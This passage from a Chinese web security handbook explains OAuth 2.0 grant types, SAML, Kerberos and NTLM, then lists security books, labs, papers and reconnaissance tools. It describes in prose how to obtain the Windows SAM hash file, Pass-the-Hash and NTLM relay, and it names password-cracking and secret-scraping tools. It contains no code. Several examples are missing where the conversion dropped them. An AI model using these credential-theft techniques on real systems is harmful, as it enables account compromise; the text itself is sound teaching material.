-   用户打开客户端以后，客户端要求用户给予授权

-   用户同意给予客户端授权

-   客户端使用上一步获得的授权，向认证服务器申请令牌

-   认证服务器对客户端进行认证以后，确认无误，同意发放令牌

-   客户端使用令牌，向资源服务器申请获取资源

-   资源服务器确认令牌无误，同意向客户端开放资源

    1.  ### 授权码模式

> 授权码模式（authorization code）是功能最完整、流程最严密的授权模式。它的特点就是通过客户端的后台服务器，与服务端的认证服务器进行互动。
>
> 其流程为：

-   用户访问客户端，后者将前者导向认证服务器

-   用户选择是否给予客户端授权

-   假设用户给予授权，认证服务器将用户导向客户端事先指定的" 重定向 URI"（redirection URI），同时附上一个授权码

-   客户端收到授权码，附上早先的" 重定向 URI"，向认证服务器申请令牌

-   认证服务器核对了授权码和重定向 URI，确认无误后，向客户端发送访问令牌（access token）和更新令牌（refresh token）

> A 步骤中，客户端申请认证的 URI，包含以下参数：

-   response_type：表示授权类型，必选项，此处的值固定为 code

-   client_id：表示客户端的 ID，必选项

-   redirect_uri：表示重定向 URI，可选项

-   scope：表示申请的权限范围，可选项

-   state：表示客户端的当前状态，需动态指定，防止 CSRF

> 例如：
>
> C 步骤中，服务器回应客户端的 URI，包含以下参数：

-   ![](media/image1.png){width="0.13541666666666666in" height="0.11805555555555555in"}code：表示授权码，必选项。该码的有效期应该很短 客户端只能使用该码一次，否则会被授权服务器拒绝。该码与客户端 ID 和重定向 URI，是一一对应关系。

-   state：如果客户端的请求中包含这个参数，认证服务器回应与请求时相同的参数例如：

> D 步骤中，客户端向认证服务器申请令牌的 HTTP 请求，包含以下参数：

-   grant_type：表示使用的授权模式，必选项，此处的值固定为 authorization_code

-   code：表示上一步获得的授权码，必选项

-   ![](media/image1.png){width="0.13541666666666666in" height="0.11805555555555555in"}redirect_uri：表示重定向 URI，必选项， 必须与 A 步骤中的该参数值保持一致

-   client_id：表示客户端 ID，必选项例如：

> E 步骤中，认证服务器发送的 HTTP 回复，包含以下参数：

-   access_token：表示访问令牌，必选项

-   token_type：表示令牌类型，该值大小写不敏感，必选项，可以是 bearer 类型或 mac 类型

-   expires_in：表示过期时间，单位为秒。如果省略该参数，必须其他方式设置过期时间

-   refresh_token：表示更新令牌，用来获取下一次的访问令牌，可选项

-   scope：表示权限范围，如果与客户端申请的范围一致，此项可省略例如：

    1.  ### 简化模式

> ![](media/image1.png){width="0.13541666666666666in" height="0.11805555555555555in"}简化模式（implicit grant type）不通过第三方应用程序的服务器，直接在浏览器中向认证服务器申请令牌，跳过了授权码这个步骤，因此得名。所有步骤在浏览器中完成，令牌对访问者是可见的， 客户端不需要认证。
>
> 其步骤为：

-   客户端将用户导向认证服务器

-   用户决定是否给于客户端授权

-   假设用户给予授权，认证服务器将用户导向客户端指定的重定向 URI，并在 URI 的 Hash 部分包含了访问令牌

-   浏览器向资源服务器发出请求，其中不包括上一步收到的 Hash 值

-   资源服务器返回一个网页，其中包含的代码可以获取 Hash 值中的令牌

-   浏览器执行上一步获得的脚本，提取出令牌

-   浏览器将令牌发给客户端

> A 步骤中，客户端发出的 HTTP 请求，包含以下参数：

-   response_type：表示授权类型，此处的值固定为 token ，必选项

-   client_id：表示客户端的 ID，必选项

-   redirect_uri：表示重定向的 URI，可选项

-   scope：表示权限范围，可选项

-   state：表示客户端的当前状态，需动态指定，防止 CSRF

> 例如：
>
> C 步骤中，认证服务器回应客户端的 URI，包含以下参数：

-   access_token：表示访问令牌，必选项

-   token_type：表示令牌类型，该值大小写不敏感，必选项

-   expires_in：表示过期时间，单位为秒。如果省略该参数，必须其他方式设置过期时间

-   scope：表示权限范围，如果与客户端申请的范围一致，此项可省略

-   state：如果客户端的请求中包含这个参数，认证服务器回应与请求时相同的参数例如：

> 在上面的例子中，认证服务器用 HTTP 头信息的 Location 栏，指定浏览器重定向的网址。注意，在这个网址的 Hash 部分包含了令牌。
>
> 根据上面的 D 步骤，下一步浏览器会访问 Location 指定的网址，但是 Hash 部分不会发送。接下来的 E 步骤，服务提供商的资源服务器发送过来的代码，会提取出 Hash 中的令牌。

### 密码模式

> 密码模式（Resource Owner Password Credentials Grant）中，用户向客户端提供自己的用户名和密码。客户端使用这些信息，向" 服务商提供商" 索要授权。
>
> 在这种模式中，用户必须把自己的密码给客户端，但是客户端不得储存密码。其步骤如下：

-   用户向客户端提供用户名和密码

-   客户端将用户名和密码发给认证服务器，向后者请求令牌

-   认证服务器确认无误后，向客户端提供访问令牌

> B 步骤中，客户端发出的 HTTP 请求，包含以下参数：

-   grant_type：表示授权类型，此处的值固定为 password ，必选项

-   username：表示用户名，必选项

-   password：表示用户的密码，必选项

-   scope：表示权限范围，可选项

> 例如：
>
> C 步骤中，认证服务器向客户端发送访问令牌，例如：

### 客户端模式

> 客户端模式（Client Credentials Grant）指客户端以自己的名义，而不是以用户的名义，向服务端进行认证。其步骤如下：

-   客户端向认证服务器进行身份认证，并要求一个访问令牌

-   认证服务器确认无误后，向客户端提供访问令牌

> A 步骤中，客户端发出的 HTTP 请求，包含以下参数：

-   granttype：表示授权类型，此处的值固定为 clientcredentials ，必选项

-   scope：表示权限范围，可选项例如：

(下页继续)

(续上页)

> B 步骤中，认证服务器向客户端发送访问令牌，例如：

### 参考链接 {#参考链接-50}

-   [rfc6749](http://www.rfcreader.com/#rfc6749)

-   [理解 OAuth](http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html)

-   [OAuth 2.0 Vulnerabilities](https://ldapwiki.com/wiki/OAuth%202.0%20Vulnerabilities)

-   [OAuth Community Site](https://oauth.net/)

-   [Hidden OAuth attack vectors](https://portswigger.net/research/hidden-oauth-attack-vectors)

    1.  # SAML

        1.  ### 简介

> SAML (Security Assertion Markup Language) 译为安全断言标记语言，是一种 xXML 格式的语言，使用
>
> XML 格式交互，来完成 SSO 的功能。
>
> SAML 存在 1.1 和 2.0 两个版本，这两个版本不兼容，不过在逻辑概念或者对象结构上大致相当，只是在一些细节上有所差异。

### 认证过程

> SAML 的认证涉及到三个角色，分别为服务提供者 (SP)、认证服务 (IDP)、用户 (Client)。一个比较典型认证过程如下：

1.  Client 访问受保护的资源

2.  SP 生成认证请求 SAML 返回给 Client

3.  Client 提交请求到 IDP

4.  IDP 返回认证请求

5.  Client 登陆 IDP

6.  认证成功后，IDP 生成私钥签名标识了权限的 SAML，返回给 Client

7.  Client 提交 SAML 给 SP

8.  SP 读取 SAML，确定请求合法，返回资源

### 安全问题

-   源于 ssl 模式下的认证可选性，可以删除签名方式标签绕过认证

-   ![](media/image1.png){width="0.13541666666666666in" height="0.11805555555555555in"}如果 SAML 中缺少了 expiration，并 断言 ID 不是唯一的，那么就可能被重放攻击影响

    1.  ### 参考链接 {#参考链接-51}

&nbsp;

-   [SAML Wiki](https://en.wikipedia.org/wiki/SAML_2.0)

-   [RFC7522](https://tools.ietf.org/html/rfc7522)

-   [SSO Wars The Token Menace](https://i.blackhat.com/USA-19/Wednesday/us-19-Munoz-SSO-Wars-The-Token-Menace.pdf)

    1.  # SCRAM

        1.  ### 简介

> SCRAM (Salted Challenge Response Authentication Mechanism) 是一套包含服务器和客户端双向确认的用户认证机制。

### 参考链接 {#参考链接-52}

#### 规范

-   [RFC 4422 Simple Authentication and Security Layer (SASL)](https://tools.ietf.org/html/rfc4422)

-   [RFC 5802 Salted Challenge Response Authentication Mechanism (SCRAM) SASL and GSS-API Mech-](https://tools.ietf.org/html/rfc5802) [anisms](https://tools.ietf.org/html/rfc5802)

-   [RFC 7677 SCRAM-SHA-256 and SCRAM-SHA-256-PLUS Simple Authentication and Security Layer](https://tools.ietf.org/html/rfc7677) [(SASL) Mechanisms](https://tools.ietf.org/html/rfc7677)

    1.  ## Windows

        1.  ### 本地用户认证

> Windows 在进行本地登录认证时操作系统会使用用户输入的密码作为凭证去与系统中的密码进行对比验证。通过 winlogon.exe 接收用户输入传递至 lsass.exe 进行认证。
>
> winlogon.exe 用于在用户注销、重启、锁屏后显示登录界面。lsass.exe 用于将明文密码变成 NTLM Hash
>
> 的形式与 SAM 数据库比较认证。

### SAM

> 安全帐户管理器 (Security Accounts Manager，SAM) 是 Windows 操作系统管理用户帐户的安全所使用的一种机制。用来存储 Windows 操作系统密码的数据库文件为了避免明文密码泄漏 SAM 文件中保存的是明文密码在经过一系列算法处理过的 Hash 值被保存的 Hash 分为 LM Hash、NTLM Hash。当用户进行身份认证时会将输入的 Hash 值与 SAM 文件中保存的 Hash 值进行对比。
>
> SAM 文 件 保 存 于 %SystemRoot%\\system32\\config\\sam 中， 在 注 册 表 中 保 存 在
>
> HKEY_LOCAL_MACHINE\\SAM\\SAM ，HKEY_LOCAL_MACHINE\\SECURITY\\SAM 。在正常情况下 SAM 文件处
>
> 于锁定状态不可直接访问、复制、移动仅有 system 用户权限才可以读写该文件。

### 密码破解

-   通 过 物 理 接 触 主 机、 启 动 其 他 操 作 系 统 来 获 取 Windows 分 区 上 的

%SystemRoot%\\system32\\config\\sam文件

-   获取 %SystemRoot%\\repair\\sam.\_ 文件。

-   使用工具从注册表中导出SAM散列值

-   从网络中嗅探分析SMB报文，从中获取密码散列

    1.  ### SPNEGO

> SPNEGO (SPNEGO: Simple and Protected GSS-API Negotiation) 是微软提供的一种使用 GSS-API 认证机制的安全协议，用于使 Webserver 共享 Windows Credentials，它扩展了 Kerberos。

1.  ## Kerberos

    1.  ### 简介

> Kerberos 协议起源于美国麻省理工学院 Athena 项目，基于公私钥加密体制，为分布式环境提供双向验证，在 RFC 1510 中被采纳，Kerberos 是 Windows 域环境中的默认身份验证协议。
>
> 简单地说，Kerberos 提供了一种单点登录 (Single Sign-On, SSO) 的方法。考虑这样一个场景，在一个网络中有不同的服务器，比如，打印服务器、邮件服务器和文件服务器。这些服务器都有认证的需求。很自然的，不可能让每个服务器自己实现一套认证系统，而是提供一个中心认证服务器 (Authentication Server, AS) 供这些服务器使用。这样任何客户端就只需维护一个密码就能登录所有服务器。
>
> Kerberos 协议是一个基于票据 (Ticket) 的系统，在 Kerberos 系统中至少有三个角色：认证服务器 (AS)，客户端 (Client) 和普通服务器 (Server)。
>
> 认证服务器对用户进行验证，并发行供用户用来请求会话票据的 TGT(票据授予票据)。票据授予服务 (TGS)
>
> 在发行给客户的 TGT 的基础上，为网络服务发行 ST(会话票据)。
>
> ![](media/image1.png){width="0.13541666666666666in" height="0.11805555555555555in"}在 Kerberos 系统中，客户端和服务器都有一个唯一的名字，叫做 Principal。同时，客户端和服务器都有自己的密码，并 它们的密码只有自己和认证服务器 AS 知道。

### 基本概念

-   #### Principal(安全个体)

    -   被认证的个体，有一个名字 (name) 和口令 (password)

-   #### KDC (Key Distribution Center)

    -   提供 ticket 和临时的会话密钥的网络服务

-   #### Ticket

    -   一个记录，用户可以用它来向服务器证明自己的身份，其中包括用户的标识、会话密钥、时间戳，以及其他一些信息。Ticket 中的大多数信息都被加密，密钥为服务器的密钥

-   #### Authenticator

    -   一个记录，其中包含一些最近产生的信息，产生这些信息需要用到用户和服务器之间共享的会话密钥

-   #### Credentials

    -   一个 ticket 加上一个秘密的会话密钥

-   #### Authentication Server (AS)

    -   通过 long-term key 认证用户

    -   AS 给予用户 ticket granting ticket 和 short-term key

    -   认证服务

-   #### Ticket Granting Server (TGS)

    -   通过 short-term key 和 Ticket Granting Ticket 认证用户

    -   TGS 发放 tickets 给用户以访问其他的服务器

    -   授权和访问控制服务

        1.  ### 简化的认证过程

            1.  客户端向服务器发起请求，请求内容是：客户端的 principal，服务器的 principal

            2.  #### AS 收到请求之后，随机生成一个密码 Kc, s(session key), 并生成以下两个票据返回给客户端

                1.  给客户端的票据，用客户端的密码加密，内容为随机密码，session，server_principal

                2.  给服务器端的票据，用服务器的密码加密，内容为随机密码，session，client_principal

                3.  ![](media/image1.png){width="0.13541666666666666in" height="0.11805555555555555in"}客户端拿到了第二步中的两个票据后，首先用自己的密码解开票据，得到 Kc、s，然后生成一个 Au- thenticator，其中主要包括当前时间和 Ts,c 的校验码，并 用 SessionKey Kc,s 加密。之后客户端将 Authenticator 和给 server 的票据同时发给服务器

                4.  #### 服务器首先用自己的密码解开票据，拿到 SessionKey Kc,s，然后用 Kc,s 解开 Authenticator，并做如下检查

                    1.  ![](media/image1.png){width="0.13541666666666666in" height="0.11805555555555555in"}检查 Authenticator 中的时间戳是不是在当前时间上下 5 分钟以内，并 检查该时间戳是否首次出现。如果该时间戳不是第一次出现，那说明有人截获了之前客户端发送的内容，进行 Replay 攻击。

                    2.  检查 checksum 是否正确

                    3.  如果都正确，客户端就通过了认证

                5.  服务器段可选择性地给客户端回复一条消息来完成双向认证，内容为用 session key 加密的时间戳

                6.  客户端通过解开消息，比较发回的时间戳和自己发送的时间戳是否一致，来验证服务器

        2.  ### 完整的认证过程

> 上方介绍的流程已经能够完成客户端和服务器的相互认证。但是，比较不方便的是每次认证都需要客户端输入自己的密码。
>
> 因此在 Kerberos 系统中，引入了一个新的角色叫做：票据授权服务 (TGS - Ticket Granting Service)，它的地位类似于一个普通的服务器，只是它提供的服务是为客户端发放用于和其他服务器认证的票据。
>
> 这样，Kerberos 系统中就有四个角色：认证服务器 (AS)，客户端 (Client)，普通服务器 (Server) 和票据授权服务 (TGS)。这样客户端初次和服务器通信的认证流程分成了以下 6 个步骤：

1.  客户端向 AS 发起请求，请求内容是：客户端的 principal，票据授权服务器的 rincipal

2.  #### AS 收到请求之后，随机生成一个密码 Kc, s(session key), 并生成以下两个票据返回给客户端：

    1.  给客户端的票据，用客户端的密码加密，内容为随机密码，session，tgs_principal

    2.  给 tgs 的票据，用 tgs 的密码加密，内容为随机密码，session，client_principal

    3.  #### 客户端拿到了第二步中的两个票据后，首先用自己的密码解开票据，得到 Kc、s，然后生成一个 Authenticator

        1.  Authenticator

        2.  给 tgs 的票据同时发给服务器

        3.  server_principal

        4.  #### TGS 首先用自己的密码解开票据，拿到 SessionKey Kc,s，然后用 Kc,s 解开 Authenticator，并做如下检查

            1.  ![](media/image1.png){width="0.13541666666666666in" height="0.11805555555555555in"}检查 Authenticator 中的时间戳是不是在当前时间上下 5 分钟以内，并 检查该时间戳是否首次出现。如果该时间戳不是第一次出现，那说明有人截获了之前客户端发送的内容，进行 Replay 攻击。

            2.  检查 checksum 是否正确

            3.  如果都正确，客户端就通过了认证

        5.  #### tgs 生成一个 session key 组装两个票据给客户端

            1.  用客户端和 tgs 的 session key 加密的票据，包含新生成的 session key 和 server_principal

            2.  用服务器的密码加密的票据，包括新生成的 session key 和 client principal

        6.  #### 客户端收到两个票据后，解开自己的，然后生成一个 Authenticator，发请求给服务器，内容包括

            1.  Authenticator

            2.  给服务器的票据

        7.  服务器收到请求后，用自己的密码解开票据，得到 session key，然后用 session key 解开 authenticator

> 对可无端进行验证

8.  服务器可以选择返回一个用 session key 加密的之前的是时间戳来完成双向验证

9.  客户端通过解开消息，比较发回的时间戳和自己发送的时间戳是否一致，来验证服务器

### 优缺点

#### 优点

-   密码不易被窃听

-   密码不在网上传输

-   密码猜测更困难

-   票据被盗之后难以使用，因为需要配合认证头来使用

#### 缺点

-   缺乏撤销机制

-   引入了复杂的密钥管理

-   需要时钟同步

-   伸缩性受限

    1.  ### 参考链接 {#参考链接-53}

#### 规范

-   [RFC 1510 The Kerberos Network Authentication Service](https://tools.ietf.org/html/rfc1510)

-   [Kerberos 认证流程详解](https://blog.csdn.net/jewes/article/details/20792021)

#### 攻击

-   [Delegate to the Top: Abusing Kerberos for arbitrary impersonations and RCE](https://www.blackhat.com/docs/asia-17/materials/asia-17-Hart-Delegate-To-The-Top-Abusing-Kerberos-For-Arbitrary-Impersonations-And-RCE-wp.pdf)

-   [Kerberos Protocol Extensions: Service for User and Constrained Delegation Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/3bff5864-8135-400e-bdd9-33b552051d94?redirectedfrom=MSDN)

-   [Kerberos Technical Supplement for Windows](https://docs.microsoft.com/en-us/previous-versions/msp-n-p/ff649429(v%3Dpandp.10))

-   [Cracking Kerberos TGS Tickets Using Kerberoast -- Exploiting Kerberos to Compromise the Active](https://adsecurity.org/?p=2293) [Directory Domain](https://adsecurity.org/?p=2293)

    1.  ## NTLM 身份验证

        1.  ### NTLM 认证

> NTLM 是 NT LAN Manager 的缩写，NTLM 是基于挑战/应答的身份验证协议，是 Windows NT 早期版本中的标准安全协议。

#### 基本流程

-   客户端在本地加密当前用户的密码成为密码散列

-   客户端向服务器明文发送账号

-   服务器端产生一个 16 位的随机数字发送给客户端，作为一个 challenge

-   客户端用加密后的密码散列来加密 challenge，然后返回给服务器，作为 response

-   服务器端将用户名、challenge、response 发送给域控制器

-   域控制器用这个用户名在 SAM 密码管理库中找到这个用户的密码散列，然后使用这个密码散列来加密 chellenge

-   域控制器比较两次加密的 challenge，如果一样那么认证成功，反之认证失败

#### Net-NTLMv1

> Net-NTLMv1 协议的基本流程如下：

-   客户端向服务器发送一个请求

-   服务器接收到请求后，生成一个 8 位的 Challenge，发送回客户端

-   客户端接收到 Challenge 后，使用登录用户的密码 hash 对 Challenge 加密，作为 response 发送给服务器

-   服务器校验 response

> Net-NTLMv1 response 的计算方法为

-   将用户的 NTLM hash 补零至 21 字节分成三组 7 字节数据

-   三组数据作为 3DES 加密算法的三组密钥，加密 Server 发来的 Challenge

> 这种方式相对脆弱，可以基于抓包工具和彩虹表爆破工具进行破解。

#### Net-NTLMv2

> 自 Windows Vista 起，微软默认使用 Net-NTLMv2 协议，其基本流程如下：

-   客户端向服务器发送一个请求

-   服务器接收到请求后，生成一个 16 位的 Challenge，发送回客户端

-   客户端接收到 Challenge 后，使用登录用户的密码 hash 对 Challenge 加密，作为 response 发送给服务器

-   服务器校验 response

    1.  ### Hash

#### LM Hash

> ![](media/image1.png){width="0.13541666666666666in" height="0.11805555555555555in"}LM Hash(LAN Manager Hash) 是 windows 最早用的加密算法，由 IBM 设计。LM Hash 使用硬编码秘钥的 DES， 存在缺陷。早期的 Windows 系统如 XP、Server 2003 等使用 LM Hash，而后的系统默认禁用了 LM Hash 并使用 NTLM Hash。
>
> LM Hash 的计算方式为：

-   转换用户的密码为大写，14 字节截断

-   不足 14 字节则需要在其后添加 0×00 补足

-   将 14 字节分为两段 7 字节的密码

-   以 KGS!@#\$% 作为秘钥对这两组数据进行 DES 加密，得到 16 字节的哈希

-   拼接后得到最后的 LM Hash。

> 作为早期的算法，LM Hash 存在着诸多问题：

-   ![](media/image1.png){width="0.13541666666666666in" height="0.11805555555555555in"}密码长度不会超过 14 字符， 不区分大小写

-   如果密码长度小于 7 位，后一组哈希的值确定，可以通过结尾为 aad3b435b51404ee 来判断密码长度不超过 7 位

-   分组加密极大程度降低了密码的复杂度

-   DES 算法强度低

#### NTLM Hash

> 为了解决 LM Hash 的安全问题，微软于 1993 年在 Windows NT 3.1 中引入了 NTLM 协议。
>
> Windows 2000 / XP / 2003 在密码超过 14 位前使用 LM Hash，在密码超过 14 位后使用 NTLM Hash。而之后从 Vista 开始的版本都使用 NTLM Hash。
>
> NTLM Hash 的计算方法为：

-   将密码转换为 16 进制，进行 Unicode 编码

-   基于 MD4 计算哈希值

    1.  ### 攻击

#### Pass The Hash

> Pass The Hash (PtH) 是攻击者捕获帐号登录凭证后，复用凭证 Hash 进行攻击的方式。
>
> 微软在 2012 年 12 月发布了针对 Pass The Hash 攻击的防御指导，文章中提到了一些防御方法，并说明了为什么不针对 Pass The Hash 提供更新补丁。

#### Pass The Key

> 在禁用 NTLM 的环境下，可以用 mimikatz 等工具直接获取密码。

#### NTLM Relay

> 攻击者可以一定程度控制客户端网络的时候，可以使用中间人攻击的方式来获取权限。对客户端伪装为身份验证服务器，对服务端伪装为需要认证的客户端。

### 参考链接 {#参考链接-54}

-   [Windows 身份认证及利用思路](https://www.freebuf.com/articles/system/224171.html)

-   [The NTLM Authentication Protocol and Security Support Provider](http://davenport.sourceforge.net/ntlm.html)

CHAPTER 10

工具与资源

1.  ## 推荐资源

    1.  ### 书单

#### 前端

-   Web 之困

-   白帽子讲 Web 安全

-   白帽子讲浏览器安全（钱文祥）

-   Web 前端黑客技术揭秘

-   XSS 跨站脚本攻击剖析与防御

-   SQL 注入攻击与防御

#### 网络

-   Understanding linux network internals

-   TCP/IP Architecture, Design, and Implementation in Linux

-   Linux Kernel Networking: Implementation and Theory

-   Bulletproof SSL and TLS

#### 323

-   UNIX Network Programming

-   TCP / IP 协议详解

#### SEO

-   SEO 艺术

#### 无线攻防

-   无线网络安全攻防实战

-   无线网络安全攻防实战进阶

-   黑客大揭秘------近源渗透测试（柴坤哲等）

#### Hacking Programming

-   Gray Hat Python

#### 社会工程学

-   社会工程：安全体系中的人性漏洞

-   反欺骗的艺术

-   反入侵的艺术

#### 数据安全

-   大数据治理与安全从理论到开源实践（刘驰等）

-   企业大数据处理 Spark、Druid、Flume 与 Kafka 应用实践（肖冠宇）

-   数据安全架构设计与实战（郑云文）

#### 机器学习与网络安全

-   Web 安全深度学习实战（刘焱）

-   Web 安全机器学习入门（刘焱）

-   Web 安全之强化学习与 GAN（刘焱）

-   AI 安全之对抗样本入门（兜哥）

#### 安全建设

-   企业安全建设入门------基于开源软件打造企业网络安全（刘焱）

-   企业安全建设指南------金融行业安全架构与技术实践（聂君等）

-   大型互联网企业安全架构（石祖文）

-   CISSP 官方学习指南

-   CISSP 认证考试指南

-   Linux 系统安全纵深防御、安全扫描与入侵检测（胥峰）

#### 综合

-   Web 安全深度剖析

-   黑客秘笈------渗透测试实用指南

-   黑客攻防技术宝典------web 实战篇

#### 法律

-   信息安全标准和法律法规（第二版）（注：武汉大学出版社）

2.  ### WebSite

    -   <https://adsecurity.org/>

3.  ### Blog

    -   <https://www.leavesongs.com/>

    -   <https://paper.seebug.org/>

    -   <https://xz.aliyun.com/>

    -   <https://portswigger.net/blog>

    -   <https://www.hackerone.com/blog>

4.  ### Bug Bounty

    -   <https://www.hackerone.com/>

    -   [https://bugcrowd.com](https://bugcrowd.com/)

    -   <https://www.synack.com/>

&nbsp;

1.  #### 推荐资源 325

    -   <https://cobalt.io/>

    1.  ### 实验环境

#### Web 安全相关 CTF 题目

-   <https://github.com/orangetw/My-CTF-Web-Challenges>

-   <https://www.ripstech.com/php-security-calendar-2017/>

-   <https://github.com/wonderkun/CTF_web>

-   <https://github.com/CHYbeta/Code-Audit-Challenges>

-   <https://github.com/l4wio/CTF-challenges-by-me>

-   <https://github.com/tsug0d/MyAwesomeWebChallenge>

-   <https://github.com/a0xnirudh/kurukshetra>

-   <http://www.xssed.com/>

#### 域实验环境

-   [Adaz](https://github.com/christophetd/Adaz): Active Directory Hunting Lab in Azure

-   [Detection](https://github.com/clong/DetectionLab) Vagrant & Packer scripts to build a lab environment complete with security tooling and logging best practices

### 知识库

#### Awesome 系列

-   [Awesome CobaltStrike](https://github.com/zer0yu/Awesome-CobaltStrike)

-   [Awesome Cybersecurity Blue Team](https://github.com/fabacab/awesome-cybersecurity-blueteam)

-   [Awesome Hacking](https://github.com/Hack-with-Github/Awesome-Hacking)

-   [awesome sec talks](https://github.com/PaulSec/awesome-sec-talks)

-   [Awesome Security](https://github.com/sbilly/awesome-security)

-   [awesome web security](https://github.com/qazbnm456/awesome-web-security)

-   [Awesome-Android-Security](https://github.com/saeidshirazi/awesome-android-security)

#### Bug Hunting

-   [HowToHunt](https://github.com/KathanP19/HowToHunt) Tutorials and Things to Do while Hunting Vulnerability

#### Java

-   [learnjavabug](https://github.com/threedr3am/learnjavabug) Java 安全相关的漏洞和技术 demo

#### 红蓝对抗

-   [atomic red team](https://github.com/redcanaryco/atomic-red-team) Small and highly portable detection tests based on MITRE's ATT&CK

#### 后渗透

-   [Powershell 攻击指南黑客后渗透之道](https://github.com/rootclay/Powershell-Attack-Guide.git)

-   [Active Directory Exploitation Cheat Sheet](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet)

2.  ## 相关论文

    1.  ### 论文列表

        -   [PRE-list](https://github.com/techge/PRE-list) List of (automatic) protocol reverse engineering tools for network protocols

    2.  ### 流量分析

        -   Plohmann D, Yakdan K, Klatt M, et al. A comprehensive measurement study of domain generating malware\[C\]//25th {USENIX} Security Symposium ({USENIX} Security 16). 2016: 263-278.

        -   Nasr M, Houmansadr A, Mazumdar A. Compressive traffic analysis: A new paradigm for scalable traffic analysis\[C\]//Proceedings of the 2017 ACM SIGSAC Conference on Computer and Communications Security. ACM, 2017: 2053-2069.

    3.  ### 漏洞自动化

        -   Staicu C A, Pradel M, Livshits B. SYNODE: Understanding and Automatically Preventing Injection Attacks on NODE. JS\[C\]//NDSS. 2018.

        -   Atlidakis V , Godefroid P , Polishchuk M . REST-ler: Automatic Intelligent REST API Fuzzing\[J\]. 2018.

        -   Alhuzali A, Gjomemo R, Eshete B, et al. {NAVEX}: Precise and Scalable Exploit Generation for Dynamic Web Applications\[C\]//27th {USENIX} Security Symposium ({USENIX} Security 18). 2018: 377-392.

&nbsp;

2.  **相关论文** **327**

    1.  ### 攻击技巧

        -   Lekies S, Kotowicz K, Groß S, et al. Code-reuse attacks for the web: Breaking cross-site scripting mitigations via script gadgets\[C\]//Proceedings of the 2017 ACM SIGSAC Conference on Computer and Communications Security. ACM, 2017: 1709-1723.

        -   Papadopoulos P, Ilia P, Polychronakis M, et al. Master of Web Puppets: Abusing Web Browsers for Persistent and Stealthy Computation\[J\]. arXiv preprint arXiv:1810.00464, 2018.

    2.  ### 攻击检测

        -   Liu T, Qi Y, Shi L, et al. Locate-then-detect: real-time web attack detection via attention-based deep neural networks\[C\]//Proceedings of the 28th International Joint Conference on Artificial Intelligence. AAAI Press, 2019: 4725-4731.

    3.  ### 隐私

        -   Klein A, Pinkas B. DNS Cache-Based User Tracking\[C\]//NDSS. 2019.

    4.  ### 指纹

        -   Hayes J, Danezis G. k-fingerprinting: A robust scalable website fingerprinting technique\[C\]//25th

> {USENIX} Security Symposium ({USENIX} Security 16). 2016: 1187-1203.

-   Overdorf R, Juarez M, Acar G, et al. How unique is your. onion?: An analysis of the fingerprint- ability of tor onion services\[C\]//Proceedings of the 2017 ACM SIGSAC Conference on Computer and Communications Security. ACM, 2017: 2021-2036.

5.  ### 侧信道

    -   Rosner N, Kadron I B, Bang L, et al. Profit: Detecting and Quantifying Side Channels in Networked Applications\[C\]//NDSS. 2019.

6.  ### 认证

    -   Ghasemisharif M, Ramesh A, Checkoway S, et al. O single sign-off, where art thou? an empirical analysis of single sign-on account hijacking and session management on the web\[C\]//27th {USENIX} Security Symposium ({USENIX} Security 18). 2018: 1475-1492.

7.  ### 防护

    -   Pellegrino G, Johns M, Koch S, et al. Deemon: Detecting CSRF with dynamic analysis and property graphs\[C\]//Proceedings of the 2017 ACM SIGSAC Conference on Computer and Communications Security. ACM, 2017: 1757-1771.

&nbsp;

3.  ## 信息收集 {#信息收集-3}

    1.  ### Whois

        -   [who.is](https://who.is/)

        -   [万网 WHOIS](https://whois.aliyun.com/)

        -   [腾讯云 WHOIS](https://whois.cloud.tencent.com/)

        -   [站长之家 WHOIS](https://whois.chinaz.com/)

    2.  ### 网站备案

        -   [天眼查](https://www.tianyancha.com/)

        -   [ICP 备案查询](http://www.beianbeian.com/)

        -   [爱站备案查询](https://icp.aizhan.com/)

    3.  ### CDN 查询

        -   [多地 Ping](https://ping.chinaz.com/)

        -   [CDN 服务商查询](https://tools.ipip.net/cdn.php)

    4.  ### 子域爆破

        -   [subDomainsBrute](https://github.com/lijiejie/subDomainsBrute)

        -   [wydomain](https://github.com/ring04h/wydomain)

        -   [broDomain](https://github.com/code-scan/BroDomain)

        -   [ESD](https://github.com/FeeiCN/ESD)

        -   [aiodnsbrute](https://github.com/blark/aiodnsbrute)

        -   [OneForAll](https://github.com/shmilylty/OneForAll)

        -   [subfinder](https://github.com/subfinder/subfinder)

        -   [altdns](https://github.com/infosec-au/altdns) Generates permutations, alterations and mutations of subdomains and then resolves them

    5.  ### 域名获取

        -   [the art of subdomain enumeration](https://github.com/appsecco/the-art-of-subdomain-enumeration)

        -   [sslScrape](https://github.com/cheetz/sslScrape/blob/master/sslScrape.py)

        -   [aquatone](https://github.com/michenriksen/aquatone) A Tool for Domain Flyovers

        -   [teemo](https://github.com/bit4woo/teemo) A Domain Name & Email Address Collection Tool

        -   [DNS DB 历史记录](https://dnsdb.io/zh-cn/)

    6.  ### 弱密码爆破

        -   [hydra](https://github.com/vanhauser-thc/thc-hydra)

        -   [medusa](https://github.com/jmk-foofus/medusa) is a high-speed network authentication cracking tool

        -   [Ncrack](https://github.com/nmap/ncrack)

        -   [htpwdScan](https://github.com/lijiejie/htpwdScan)

        -   [patator](https://github.com/lanjelot/patator)

    7.  ### Git 信息泄漏

        -   [GitHack By lijiejie](https://github.com/lijiejie/GitHack)

        -   [GitHack By BugScan](https://github.com/BugScanTeam/GitHack)

        -   [GitTools](https://github.com/internetwache/GitTools)

        -   [Zen](https://github.com/s0md3v/Zen)

        -   [dig github history](https://github.com/dxa4481/truffleHog)

        -   [gitrob Reconnaissance tool for GitHub organizations](https://github.com/michenriksen/gitrob)

        -   [git secrets](https://github.com/awslabs/git-secrets)

        -   [shhgit](https://github.com/eth0izzle/shhgit) Find GitHub secrets in real time

        -   [GitHound](https://github.com/tillson/git-hound) GitHound pinpoints exposed API keys on GitHub using pattern matching, commit history searching, and a unique result scoring system. A batch-catching, pattern-matching, patch-attacking secret snatcher

        -   [x patrol](https://github.com/MiSecurity/x-patrol) Github leaked patrol

        -   [GitDorker](https://github.com/obheda12/GitDorker) scrape secrets from GitHub through usage of a large repository of dorks

    8.  ### Github 监控

        -   [Github Monitor](https://github.com/VKSRC/Github-Monitor) Github Sensitive Information Leakage Monitor

        -   [Github Dorks](https://github.com/techgaun/github-dorks)

        -   [GSIL](https://github.com/FeeiCN/GSIL)

        -   [Hawkeye](https://github.com/0xbug/Hawkeye)

